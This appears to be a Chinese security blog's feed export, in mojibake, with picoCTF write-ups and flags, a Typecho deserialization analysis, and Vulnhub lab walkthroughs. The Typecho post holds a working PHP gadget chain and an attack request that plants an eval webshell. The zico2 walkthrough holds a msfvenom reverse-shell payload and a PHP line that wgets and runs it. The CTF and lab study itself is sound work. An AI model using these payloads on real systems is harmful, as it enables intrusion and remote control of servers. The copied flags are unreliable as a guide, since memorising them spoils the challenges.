<h3 id="MASTER-CHALLENGE"><a href="#MASTER-CHALLENGE" class="headerlink" title="MASTER CHALLENGE"></a>MASTER CHALLENGE</h3><blockquote>
<p>Lazy Dev</p>
<p>I really need to login to this <a href="http://shell2017.picoctf.com:35895/">website</a>, but the developer hasnâ€™t implemented login yet. Can you help?</p>
<p>**** HINTS</p>
<p>Where does the password check actually occur?</p>
<p>Can you interact with the javascript directly?</p>
</blockquote>
<p><strong>WriteUp</strong></p>
<pre><code>çœ‹ä¸€ä¸‹æºç ï¼Œjsæ–‡ä»¶ä¸­æœ‰ä¸€æ®µæœ‰é—®é¢˜å¯¼è‡´æ€»æ˜¯è¿”å›falseã€‚
//Validate the password. TBD!
function validate(pword)&#123;
  //TODO: Implement me
  return true;
&#125;

//Make an ajax request to the server
function make_ajax_req(input)&#123;
  var text_response;
  var http_req = new XMLHttpRequest();
  var params = &quot;pword_valid=&quot; + input.toString();
  http_req.open(&quot;POST&quot;, &quot;login&quot;, true);
  http_req.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);
  http_req.onreadystatechange = function() &#123;//Call a function when the state changes.
      if(http_req.readyState == 4 &amp;&amp; http_req.status == 200) &#123;
      document.getElementById(&quot;res&quot;).innerHTML = http_req.responseText;
    &#125;
  &#125;
  http_req.send(params);
&#125;

//Called when the user submits the password
function process_password()&#123;
  var pword = document.getElementById(&quot;password&quot;).value;
  var res = validate(pword);
  var server_res = make_ajax_req(res);
&#125;
æœ‰é—®é¢˜çš„å°±æ˜¯--&gt;
function validate(pword)&#123;
  //TODO: Implement me
  return true;
&#125;
å¯¼è‡´çš„å°±æ˜¯pword_valid=falseã€‚ï¼ˆ var params = &quot;pword_valid=&quot; + input.toString();ï¼‰
F12è¿›è¡Œè°ƒè¯•ï¼Œæ”¹ä¸ºtrueã€‚</code></pre>
<p><strong>Flag</strong></p>
<pre><code>client_side_is_the_dark_sidebde1f567656f8c9b654a1ec24e1ff889</code></pre>
<h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><h3 id="Web-1"><a href="#Web-1" class="headerlink" title="Web"></a>Web</h3><h4 id="1-My-First-SQL"><a href="#1-My-First-SQL" class="headerlink" title="1.My First SQL"></a>1.My First SQL</h4><blockquote>
<p>I really need access to <a href="http://shell2017.picoctf.com:54020/">website</a>, but I forgot my password and there is no reset. Can you help?</p>
<p>**** HINTS</p>
<p>Have you heard about SQL injection?</p>
</blockquote>
<p><strong>WriteUp</strong></p>
<pre><code>payload:
user:1&#39; or &#39;&#39;=&#39;
password:1&#39; or &#39;&#39;=&#39;</code></pre>
<p><strong>Flag</strong></p>
<pre><code>be_careful_what_you_let_people_ask_104d9ea430b41fb4c5560eecc0652111</code></pre>
<h4 id="2-TW-GR-E1-ART"><a href="#2-TW-GR-E1-ART" class="headerlink" title="2.TW_GR_E1_ART"></a>2.TW_GR_E1_ART</h4><blockquote>
<p>Oh, sweet, they made a spinoff game to Toaster Wars! That last room has a lot of flags in it though. I wonder which is the right oneâ€¦? Check it out <a href="http://shell2017.picoctf.com:55830/">here</a>.</p>
<p>**** HINTS</p>
<p>I think this game is running on a Node.js server. If itâ€™s configured poorly, you may be able to access the serverâ€™s source. If my memory serves me correctly, Node servers have a special file that lists dependencies and a start command; maybe you can use that file to figure out where the other files are?</p>
</blockquote>
<h3 id="MISC-1"><a href="#MISC-1" class="headerlink" title="MISC"></a>MISC</h3><h4 id="1-Yarn"><a href="#1-Yarn" class="headerlink" title="1.Yarn"></a>1.Yarn</h4><blockquote>
<p>I was told to use the linux strings command on <a href="https://webshell2017.picoctf.com/static/9adb6ebf01d8755201564dba69bc1a92/yarn">yarn</a>, but it doesnâ€™t work. Can you help? I lost the flag in the binary somewhere, and would like it back</p>
<p>**** HINTS</p>
<p>What does the strings command use to determine if something is a string?</p>
<p>Is there an option to change the length of what strings considers as valid?</p>
</blockquote>
<p><strong>WriteUp</strong></p>
<pre><code>winhexæ‰“å¼€å¯ä»¥çœ‹åˆ°Submit_me_for_I_am_the_flagï¼Œè¿™å°±æ˜¯flagã€‚
æˆ–
linuxä¸‹æ‰§è¡Œå‘½ä»¤
strings -n 2 -d flag yarn</code></pre>
<p><strong>Flag</strong></p>
<pre><code>Submit_me_for_I_am_the_flag</code></pre>
<p>####2.Mystery Box</p>
<blockquote>
<p>Youâ€™ve found a mystery machine with a sticky <a href="https://webshell2017.picoctf.com/static/65c2504106ce38d8c2971ebaada542c7/note.txt">note</a> attached to it! Oh, thereâ€™s also this <a href="https://webshell2017.picoctf.com/static/65c2504106ce38d8c2971ebaada542c7/MysteryBox.png">picture</a> of the machine you found.</p>
<p>**** HINTS</p>
<p>It really gets your gears Turing.</p>
<p>I hear thereâ€™s something Naval about it.</p>
</blockquote>
<p><strong>WriteUp</strong></p>
<pre><code>Enigmaå¯†ç æœº
http://enigma.louisedade.co.uk/enigma.html?m3;b;b123;ALOG;APPP;FH-GL
åœ¨çº¿è§£å¯†</code></pre>
<p><strong>Flag</strong></p>
<pre><code>QUITEPUZZLINGINDEED</code></pre>
]]></content>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Typechoååºåˆ—åŒ–æ¼æ´åˆ†æ</title>
    <url>/2020/03/15/typecho-fan-xu-lie-hua-lou-dong-fen-xi/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>çªç„¶æƒ³èµ·äº†è¿™ä¸ªæ¼æ´ï¼Œæ¥åˆ†æä¸€ä¸‹æ¼æ´åˆ©ç”¨é“¾å­¦ä¹ ä¸€ä¸‹</p>
<p><strong>æ¼æ´åŸå› ï¼š</strong></p>
<p>ç¨‹åºå®‰è£…åä¸ä¼šè‡ªåŠ¨åˆ é™¤install.phpï¼Œinstall.phpä¸­å­˜åœ¨ååºåˆ—åŒ–æ¼æ´å¼•å‘ã€‚</p>
<p><strong>æµ‹è¯•ç‰ˆæœ¬ï¼š</strong><a href="https://github.com/typecho/typecho/releases">v1.1-15.5.12-beta</a></p>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>åœ¨install.phpæ–‡ä»¶ä¸­æœç´¢<code>unserialize</code>å°±èƒ½ç›´æ¥æ‰¾ã€‚</p>
<pre><code class="php"> $config = unserialize(base64_decode(Typecho_Cookie::get(&#39;__typecho_config&#39;)));
 Typecho_Cookie::delete(&#39;__typecho_config&#39;);
 $db = new Typecho_Db($config[&#39;adapter&#39;], $config[&#39;prefix&#39;]);</code></pre>
<p>è¿™é‡Œååºåˆ—åŒ–äº†<code>Typecho_Cookie::get(&#39;__typecho_config&#39;)</code>çš„å†…å®¹ï¼ˆbase64ç¼–ç çš„ï¼‰ï¼Œè·Ÿè¿›Typecho_Cookieçš„getæ–¹æ³•ï¼š</p>
<pre><code class="php">    public static function get($key, $default = NULL)
    &#123;
        $key = self::$_prefix . $key;
        $value = isset($_COOKIE[$key]) ? $_COOKIE[$key] : (isset($_POST[$key]) ? $_POST[$key] : $default);
        return is_array($value) ? $default : $value;
    &#125;</code></pre>
<p>è¿™é‡Œå¯ä»¥é€šè¿‡cookieæˆ–è€…postçš„æ–¹å¼ä¼ å…¥ï¼Œä¼ å…¥ååºåˆ—åŒ–çš„å†…å®¹å°±å¯æ§äº†ã€‚</p>
<p>ç„¶ååœ¨ä¸‹é¢çš„ä»£ç ä¸­åˆšæ‰ååºåˆ—åŒ–åçš„configå˜é‡ä½œä¸ºå‚æ•°ä¼ å…¥äº†Typecho_Dbç±»ä¸­ï¼Œ</p>
<pre><code class="php"> $db = new Typecho_Db($config[&#39;adapter&#39;], $config[&#39;prefix&#39;]);</code></pre>
<p>è·Ÿè¿›Typecho_Dbç±»ï¼š</p>
<pre><code class="php">public function __construct($adapterName, $prefix = &#39;typecho_&#39;)
    &#123;
        /** è·å–é€‚é…å™¨åç§° */
        $this-&gt;_adapterName = $adapterName;

        /** æ•°æ®åº“é€‚é…å™¨ */
        $adapterName = &#39;Typecho_Db_Adapter_&#39; . $adapterName;

        if (!call_user_func(array($adapterName, &#39;isAvailable&#39;))) &#123;
            throw new Typecho_Db_Exception(&quot;Adapter &#123;$adapterName&#125; is not available&quot;);
        &#125;

        $this-&gt;_prefix = $prefix;

        /** åˆå§‹åŒ–å†…éƒ¨å˜é‡ */
        $this-&gt;_pool = array();
        $this-&gt;_connectedPool = array();
        $this-&gt;_config = array();

        //å®ä¾‹åŒ–é€‚é…å™¨å¯¹è±¡
        $this-&gt;_adapter = new $adapterName();
    &#125;</code></pre>
<p><code>&#39;Typecho_Db_Adapter_&#39; . $adapterName;</code>è¿™é‡Œå­—ç¬¦ä¸²æ‹¼æ¥å˜é‡ï¼Œä¼šè§¦å‘<code>__toString</code>é­”æœ¯æ–¹æ³•ï¼Œæœç´¢ä»£ç ä¸­çš„toStingå‡½æ•°ï¼Œåœ¨<code>\var\Typecho\Feed.php</code>ä¸­å®šä¹‰çš„<code>__toString</code>æ–¹æ³•ä¸­ï¼š</p>
<pre><code class="php">    public function __toString()
    &#123;
      ......
    foreach ($this-&gt;_items as $item) &#123;
      $content .= &#39;&lt;item&gt;&#39; . self::EOL;
      $content .= &#39;&lt;title&gt;&#39; . htmlspecialchars($item[&#39;title&#39;]) . &#39;&lt;/title&gt;&#39; . self::EOL;
      $content .= &#39;&lt;link&gt;&#39; . $item[&#39;link&#39;] . &#39;&lt;/link&gt;&#39; . self::EOL;
      $content .= &#39;&lt;guid&gt;&#39; . $item[&#39;link&#39;] . &#39;&lt;/guid&gt;&#39; . self::EOL;
      $content .= &#39;&lt;pubDate&gt;&#39; . $this-&gt;dateFormat($item[&#39;date&#39;]) . &#39;&lt;/pubDate&gt;&#39; . self::EOL;
      $content .= &#39;&lt;dc:creator&gt;&#39; . htmlspecialchars($item[&#39;author&#39;]-&gt;screenName) . &#39;&lt;/dc:creator&gt;&#39; . self::EOL;
      ......
</code></pre>
<p><code>$item[&#39;author&#39;]-&gt;screenName</code>è¿™é‡Œå¦‚æœ<code>$item[&#39;author&#39;]</code> æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œä¸”ä¸å­˜åœ¨<code>screenName</code>å±æ€§æ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨<code>__get</code>é­”æ³•å‡½æ•°ã€‚</p>
<p>å…¨å±€æœç´¢<code>__get</code>å‡½æ•°ååœ¨ç»“æœä¸­è·Ÿè¿›çœ‹ä¸€çœ‹ï¼Œåœ¨<code>/var/Typecho/Request.php</code>ä¸­çš„__getæ–¹æ³•æœ‰å¦‚ä¸‹ä»£ç ï¼Œå…¶è°ƒç”¨äº†è‡ªå·±çš„getæ–¹æ³•ï¼š</p>
<pre><code class="php">public function __get($key)
    &#123;
        return $this-&gt;get($key);
        &#125;</code></pre>
<p>getæ–¹æ³•å¦‚ä¸‹ï¼š</p>
<pre><code class="php">    public function get($key, $default = NULL)
    &#123;
        switch (true) &#123;
            case isset($this-&gt;_params[$key]):
                $value = $this-&gt;_params[$key];
                break;
            case isset(self::$_httpParams[$key]):
                $value = self::$_httpParams[$key];
                break;
            default:
                $value = $default;
                break;
        &#125;

        $value = !is_array($value) &amp;&amp; strlen($value) &gt; 0 ? $value : $default;
        return $this-&gt;_applyFilter($value);
    &#125;</code></pre>
<p>å®ƒä¼šç»™<code>$value</code>èµ‹å€¼ï¼Œç„¶åè°ƒç”¨è‡ªå·±çš„<code>_applyFilter</code>æ–¹æ³•ï¼Œè·Ÿè¿›<code>_applyFilter</code>æ–¹æ³•</p>
<pre><code class="php">    private function _applyFilter($value)
    &#123;
        if ($this-&gt;_filter) &#123;
            foreach ($this-&gt;_filter as $filter) &#123;
                $value = is_array($value) ? array_map($filter, $value) :
                call_user_func($filter, $value);
            &#125;

            $this-&gt;_filter = array();
        &#125;

        return $value;
    &#125;</code></pre>
<p><code>$filter, $value</code>éƒ½æ˜¯å¯æ§çš„ï¼Œå¯ä»¥åˆ©ç”¨<code>array_map</code>æˆ–<code>call_user_func</code>æ‰§è¡Œä»£ç ã€‚</p>
<p>PSï¼šåœ¨install.phpä¸­è¦æ»¡è¶³å¦‚ä¸‹çš„æ¡ä»¶æ‰ä¼šæ‰§è¡Œååºåˆ—åŒ–ä»£ç ï¼š</p>
<pre><code class="php">if (!empty($_GET) || !empty($_POST)) &#123;
    if (empty($_SERVER[&#39;HTTP_REFERER&#39;])) &#123;
        exit;
    &#125;
&lt;?php if (isset($_GET[&#39;finish&#39;])) : ?&gt;
  ......
  &lt;?php elseif (!Typecho_Cookie::get(&#39;__typecho_config&#39;)): ?&gt;
  &lt;?php else : ?&gt;
    unserialize......</code></pre>
<p>ç¡®ä¿<code>fisishï¼Œ__typecho_config</code>æœ‰å€¼å°±å¯ä»¥äº†,è€Œä¸”è¦è®¾ç½®refererã€‚</p>
<h2 id="æ„é€ payload"><a href="#æ„é€ payload" class="headerlink" title="æ„é€ payload"></a>æ„é€ payload</h2><pre><code class="php">&lt;?php
class Typecho_Feed&#123;
    private $_type = &#39;ATOM 1.0&#39;;
    private $_items = array();
    public function addItem(array $item)&#123;
        $this-&gt;_items[] = $item;
    &#125;
&#125;
class Typecho_Request&#123;
    private $_params = array(&#39;screenName&#39;=&gt; &#39;file_put_contents(\&#39;shell.php\&#39;, \&#39;&lt;?php @eval($_POST[l]);?&gt;\&#39;)&#39;);
    private $_filter = array(&#39;assert&#39;);
&#125;
$payload1 = new Typecho_Feed();
$payload2 = new Typecho_Request();
$payload1-&gt;addItem(array(&#39;author&#39; =&gt; $payload2));
$exp = array(&#39;adapter&#39; =&gt; $payload1, &#39;prefix&#39; =&gt; &#39;typecho&#39;);
echo base64_encode(serialize($exp));
?&gt;</code></pre>
<h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><pre><code class="php">POST /typecho/install.php?finish=1 HTTP/1.1
Host: 127.0.0.1:8001
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 519
Origin: http://127.0.0.1:8001
Connection: close
Referer: http://127.0.0.1:8001/typecho/install.php?finish=1
Cookie: PHPSESSID=nf3917m3bbml051b4d8up56qn4; __typecho_lang=zh_CN
Upgrade-Insecure-Requests: 1

__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTk6ImZpbGVfcHV0X2NvbnRlbnRzKCdzaGVsbC5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW2xdKTs%2FPicpIjt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfZmlsdGVyIjthOjE6e2k6MDtzOjY6ImFzc2VydCI7fX19fX1zOjY6InByZWZpeCI7czo3OiJ0eXBlY2hvIjt9</code></pre>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/p2.png"></p>
<p>â€‹        å…¶å®å·²ç»æ‰§è¡ŒæˆåŠŸäº†ã€‚    </p>
<p><img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/article_imgs/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/p1.png"></p>
<blockquote>
<p>åˆ«å¿˜äº†æ·»åŠ Referer</p>
</blockquote>
<h2 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h2><p>åˆ é™¤install.phpå’Œinstallç›®å½•</p>
]]></content>
      <categories>
        <category>ä»£ç å®¡è®¡</category>
      </categories>
      <tags>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>Typecho è®©æ³¨å†Œç”¨æˆ·ç›´æ¥å¯ä»¥å‘å¸ƒæ–‡ç« (æ— éœ€å®¡æ ¸)</title>
    <url>/2017/10/15/typecho-rang-zhu-ce-yong-hu-zhi-jie-ke-yi-fa-bu-wen-zhang-wu-xu-shen-he/</url>
    <content><![CDATA[<h1 id="Typecho-è®©æ³¨å†Œç”¨æˆ·ç›´æ¥å¯ä»¥å‘å¸ƒæ–‡ç« -æ— éœ€å®¡æ ¸"><a href="#Typecho-è®©æ³¨å†Œç”¨æˆ·ç›´æ¥å¯ä»¥å‘å¸ƒæ–‡ç« -æ— éœ€å®¡æ ¸" class="headerlink" title="Typecho è®©æ³¨å†Œç”¨æˆ·ç›´æ¥å¯ä»¥å‘å¸ƒæ–‡ç« (æ— éœ€å®¡æ ¸)"></a>Typecho è®©æ³¨å†Œç”¨æˆ·ç›´æ¥å¯ä»¥å‘å¸ƒæ–‡ç« (æ— éœ€å®¡æ ¸)</h1><p>â€‹    ç”¨Typechoæ­å»ºçš„æ–°ç”Ÿç­¾åˆ°å¹³å°ï¼Œé»˜è®¤æƒ…å†µä¸‹æ³¨å†Œçš„ç”¨æˆ·å±äºå…³æ³¨ç€ç±»åˆ«ï¼Œå•¥æƒé™æ²¡æœ‰ï¼Œåº”è¯¥ç»™äºˆè´¡çŒ®è€…çš„ç­‰çº§ï¼Œå¯ä»¥å‘å¸ƒæ–‡ç« ï¼Œä¸å…·å¤‡ç®¡ç†çš„æƒé™ï¼Œè¦å»åå°æ‰‹åŠ¨æ›´æ”¹ï¼Œè¿˜æœ‰å°±æ˜¯å‘å¸ƒçš„æ–‡ç« å¿…é¡»ç®¡ç†å‘˜å®¡æ ¸æ‰ä¼šæ˜¾ç¤ºåœ¨ä¸»é¡µã€‚é€šè¿‡æ›´æ”¹ä»£ç å¯ä»¥å®ç°æ³¨å†Œç”¨æˆ·ç›´æ¥å¯ä»¥å‘å¸ƒæ–‡ç« ã€‚       <a href="https://qqdie.com/archives/typecho-send-articles.html/comment-page-1">â€“è½¬è½½æ¥æº</a></p>
<h2 id="è®©æ³¨å†Œçš„äººæˆä¸ºè´¡çŒ®è€…ç»„"><a href="#è®©æ³¨å†Œçš„äººæˆä¸ºè´¡çŒ®è€…ç»„" class="headerlink" title="è®©æ³¨å†Œçš„äººæˆä¸ºè´¡çŒ®è€…ç»„"></a>è®©æ³¨å†Œçš„äººæˆä¸ºè´¡çŒ®è€…ç»„</h2><p>ä¿®æ”¹æ–‡ä»¶<code>\var\Widget\Register.php</code>ç¬¬<code>68</code>è¡Œï¼š</p>
<pre><code>        $dataStruct = array(
            &#39;name&#39;      =&gt;  $this-&gt;request-&gt;name,
            &#39;mail&#39;      =&gt;  $this-&gt;request-&gt;mail,
            &#39;screenName&#39;=&gt;  $this-&gt;request-&gt;name,
            &#39;password&#39;  =&gt;  $hasher-&gt;HashPassword($generatedPassword),
            &#39;created&#39;   =&gt;  $this-&gt;options-&gt;gmtTime,
            &#39;group&#39;     =&gt;  &#39;subscriber&#39;
        );
</code></pre>
<p>è¿™ä¸ªæ•°ç»„é‡Œé¢æœ‰ä¸ª<code>&#39;group&#39;</code>åº”è¯¥å°±æ˜¯äº†ï¼Œå°†<code>&#39;subscriber&#39;</code>æ”¹æˆ<code>&#39;contributor&#39;</code>å°±è¡Œäº†ã€‚</p>
<h2 id="è®©-â€œè´¡çŒ®è€…â€-å‘å¸–ç›´æ¥é€šè¿‡æ— éœ€å®¡æ ¸"><a href="#è®©-â€œè´¡çŒ®è€…â€-å‘å¸–ç›´æ¥é€šè¿‡æ— éœ€å®¡æ ¸" class="headerlink" title="è®© â€œè´¡çŒ®è€…â€ å‘å¸–ç›´æ¥é€šè¿‡æ— éœ€å®¡æ ¸"></a>è®© â€œè´¡çŒ®è€…â€ å‘å¸–ç›´æ¥é€šè¿‡æ— éœ€å®¡æ ¸</h2><blockquote>
<p>æ–¹æ³•å‚è€ƒï¼š<a href="http://forum.typecho.org/viewtopic.php?f=4&amp;t=7771">http://forum.typecho.org/viewtopic.php?f=4&amp;t=7771</a></p>
</blockquote>
<p>ä¿®æ”¹<code>var/Widget/Contents/Post/Edit.php</code>çš„ç¬¬<code>222</code>å’Œ<code>299</code>è¡Œï¼ˆå¼€å‘æ¿åœ¨ 223 å’Œ 230 è¡Œï¼‰<br>å°†<code>â€œeditorâ€</code>ä¸º<code>â€œcontributorâ€</code>å³å¯ã€‚</p>
]]></content>
      <categories>
        <category>other</category>
      </categories>
      <tags>
        <tag>Typecho</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub-zico2é¶æœºè®°å½•</title>
    <url>/2019/07/15/vulnhub-zico2-ba-ji/</url>
    <content><![CDATA[<blockquote>
<p>å°å­¦æœŸå®è®­çš„ä»»åŠ¡ï¼Œé¡ºä¾¿è®°å½•ä¸€ä¸‹XD</p>
</blockquote>
<a id="more"></a>

<blockquote>
<p>é¢˜ç›®ï¼š</p>
<p>ä¸‹è½½:<a href="https://www.vulnhub.com/entry/zico2-1,210/">https://www.vulnhub.com/entry/zico2-1,210/</a></p>
</blockquote>
<h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><p>ä½¿ç”¨VMwareå¯¼å…¥ovaï¼Œè™šæ‹Ÿæœºå¯¼å…¥æ—¶é…ç½®ç½‘ç»œæ¨¡å¼ä¸ºä»…ä¸»æœºã€‚</p>
<blockquote>
<p>æ¨èVirtualboxï¼Œæˆ‘å› ä¸ºå·æ‡’ç”¨Vmï¼Œä½†æ˜¯åæ¥ææƒæ—¶Vmæ€»æ˜¯å´©æºƒ= =</p>
</blockquote>
<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><h3 id="1ï¼‰ä¸»æœºå‘ç°-ç«¯å£æ‰«æ"><a href="#1ï¼‰ä¸»æœºå‘ç°-ç«¯å£æ‰«æ" class="headerlink" title="1ï¼‰ä¸»æœºå‘ç°/ç«¯å£æ‰«æ"></a>1ï¼‰ä¸»æœºå‘ç°/ç«¯å£æ‰«æ</h3><p>é€šè¿‡ifconfigç¡®è®¤ç½‘å¡çš„ç½‘æ®µï¼Œnmapæ‰«æã€‚</p>
<p><img src="https://lanvnal.github.io/images/zico2/image1.png"></p>
<p>å‘ç°äº†ipå’Œå¼€æ”¾ç«¯å£</p>
<h3 id="2ï¼‰ç›®å½•æ‰«æ"><a href="#2ï¼‰ç›®å½•æ‰«æ" class="headerlink" title="2ï¼‰ç›®å½•æ‰«æ"></a>2ï¼‰ç›®å½•æ‰«æ</h3><p>ä½¿ç”¨dirsearchæ‰«ä¸€æ³¢çœ‹çœ‹æœ‰ä»€ä¹ˆå‘ç°ã€‚</p>
<p><img src="https://lanvnal.github.io/images/zico2/image2.png"></p>
<p>æœ‰æ‰€å‘ç°ï¼Œdbadminç›®å½•çœ‹èµ·æ¥æ˜¯ä¸ªåå°ç›®å½•</p>
<h3 id="3ï¼‰ç½‘ç«™æ‰«æ"><a href="#3ï¼‰ç½‘ç«™æ‰«æ" class="headerlink" title="3ï¼‰ç½‘ç«™æ‰«æ"></a>3ï¼‰ç½‘ç«™æ‰«æ</h3><p>æ‹¿æ‰«æå·¥å…·æ‰«ä¸€ä¸‹ç½‘ç«™</p>
<p><img src="https://lanvnal.github.io/images/zico2/image3.png"></p>
<p>å¯èƒ½å­˜åœ¨èƒ½åˆ©ç”¨æœ¬åœ°æ–‡ä»¶åŒ…å«ã€‚</p>
<h2 id="Webç«™ç‚¹æ¸—é€"><a href="#Webç«™ç‚¹æ¸—é€" class="headerlink" title="Webç«™ç‚¹æ¸—é€"></a>Webç«™ç‚¹æ¸—é€</h2><p>è®¿é—®/dbadminå‘ç°æœ‰ä¸ªæ•°æ®åº“ç®¡ç†é¡µé¢ã€‚</p>
<p><img src="https://lanvnal.github.io/images/zico2/image4.png"></p>
<p><img src="https://lanvnal.github.io/images/zico2/image5.png"></p>
<p>å°è¯•ä½¿ç”¨å¼±å£ä»¤adminç›´æ¥ç™»å½•è¿›å»ã€‚</p>
<p>æµè§ˆæ•°æ®åº“ä¸­ä¿¡æ¯æ—¶å‘ç°äº†å­˜å‚¨çš„ç”¨æˆ·åå’Œå¯†ç ã€‚</p>
<p><img src="https://lanvnal.github.io/images/zico2/image6.png"></p>
<p>å»cmd5å°è¯•è§£å¯†ï¼Œè¯´ä¸å®šæœ‰ç”¨ã€‚</p>
<p><img src="https://lanvnal.github.io/images/zico2/image7.png"></p>
<p><img src="https://lanvnal.github.io/images/zico2/image8.png"></p>
<p>åœ¨exploit-dbæŸ¥è¯¢åˆ°è¯¥ç‰ˆæœ¬çš„phpliteadminå­˜åœ¨ä»£ç æ³¨å…¥æ¼æ´ï¼Œé“¾æ¥ï¼š</p>
<p><a href="https://www.exploit-db.com/exploits/24044">https://www.exploit-db.com/exploits/24044</a></p>
<p>æŒ‰ç…§expdbçš„æè¿°ï¼Œåˆ›å»ºåä¸ºshell.phpçš„æ•°æ®åº“ã€‚</p>
<p>ç„¶ååœ¨è¯¥æ•°æ®åº“ä¸‹åˆ›å»ºåä¸º<code>&lt;?php @eval($_POST[&#39;a&#39;]); ?&gt;</code>çš„è¡¨ã€‚</p>
<p><img src="https://lanvnal.github.io/images/zico2/image9.png"></p>
<p>View.phpå­˜åœ¨æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ã€‚</p>
<p><img src="https://lanvnal.github.io/images/zico2/image10.png"></p>
<p>éªŒè¯LFIå­˜åœ¨ï¼Œç”¨å®ƒæ¥åŒ…å«åˆ›å»ºçš„æ•°æ®åº“æ–‡ä»¶å°±èƒ½å¾—åˆ°webshellã€‚</p>
<p>ä½†æ˜¯æ€»æ˜¯500é”™è¯¯ï¼Œå†™ä¸€å¥è¯æœªèƒ½æˆåŠŸã€‚</p>
<p>ç»éªŒè¯wgetå¯ä»¥æ‰§è¡Œï¼Œå¯ä»¥é€šè¿‡wgetä¸‹è½½ä¸€ä¸ªshellåå¼¹åˆ°msfã€‚</p>
<p><img src="https://lanvnal.github.io/images/zico2/image11.png"></p>
<p>éªŒè¯å‘ç°å¯ä»¥æ‰§è¡Œwgetã€‚</p>
<p>é€šè¿‡msfvenomç”Ÿæˆä¸ªé©¬ä¼ ä¸Šå»ã€‚</p>
<pre><code>./msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=172.16.241.1 lport=4444 -f elf &gt; zicoshell</code></pre>
<pre><code>&lt;?php system(&quot;rm /tmp/zicoshell;cd /tmp;wget http://172.16.241.1:8080/zicoshell;chmod +x zicoshell;./zicoshell&quot;);?&gt;</code></pre>
<p><img src="https://lanvnal.github.io/images/zico2/image12.png"></p>
<p>Msfè®¾ç½®ç›‘å¬åŒæ—¶é€šè¿‡LFIå»åŒ…å«ã€‚</p>
<p><img src="https://lanvnal.github.io/images/zico2/image13.png"></p>
<p>æˆåŠŸåå¼¹å›æ¥ã€‚</p>
<h2 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h2><p>ç°åœ¨æ˜¯www-dataç”¨æˆ·ï¼Œé€šè¿‡Linuxå†…æ ¸çš„æ¼æ´æ¥ææƒè‡³rootæƒé™ã€‚</p>
<p>é€šè¿‡expdbæŸ¥æ‰¾åˆ°expã€‚</p>
<p>é€šè¿‡msfä¸Šä¼ expï¼Œç¼–è¯‘åè¿è¡Œã€‚</p>
<p>è¿™é‡Œé‡åˆ°äº†ä¸€äº›é—®é¢˜ï¼Œåº”è¯¥æ˜¯VMè™šæ‹Ÿæœºçš„é—®é¢˜ï¼Œä¸€ææƒå°±å´©æºƒï¼Œæ¢Vitualboxå°±èƒ½ä¸€æ¬¡æˆåŠŸã€‚</p>
<p><img src="https://lanvnal.github.io/images/zico2/image14.png"></p>
]]></content>
      <tags>
        <tag>WriteUp</tag>
        <tag>Vulnhub</tag>
        <tag>é¶æœº</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhubé¶æœºä¹‹HackNos-2.1</title>
    <url>/2020/02/07/vulnhub-ba-ji-zhi-hacknos2/</url>
    <content><![CDATA[<h2 id="é¶æœºä¿¡æ¯"><a href="#é¶æœºä¿¡æ¯" class="headerlink" title="é¶æœºä¿¡æ¯"></a>é¶æœºä¿¡æ¯</h2><ul>
<li><strong><a href="https://www.vulnhub.com/entry/hacknos-os-hacknos-21,403/">hackNos: Os-hackNos-2.1</a></strong></li>
<li><strong>Name</strong>: hackNos: Os-hackNos-2.1</li>
<li><strong>Date release</strong>: 29 Nov 2019</li>
<li><strong>Author</strong>: <a href="https://www.vulnhub.com/author/rahul-gehlaut,656/">Rahul Gehlaut</a></li>
<li><strong>Difficulty</strong> : Easy to Intermediate</li>
<li><strong>Flag</strong> : 2 Flag first user And second root</li>
<li><strong>Learning</strong> : Web Application | Enumeration | Password Cracking</li>
</ul>
